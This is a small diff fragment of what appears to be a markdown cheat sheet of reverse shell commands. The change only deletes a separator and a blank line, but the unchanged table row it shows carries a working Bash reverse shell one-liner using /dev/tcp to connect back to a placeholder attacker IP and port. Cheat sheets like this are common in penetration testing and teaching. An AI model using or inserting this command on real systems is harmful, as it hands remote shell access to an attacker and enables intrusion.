@@ -1,5 +1,3 @@
----
-
 | **Language/Tool** | **Reverse Shell Command** | **Notes** |
 | --- | --- | --- |
 | **Bash** | `bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1` | Simple Bash reverse shell. |
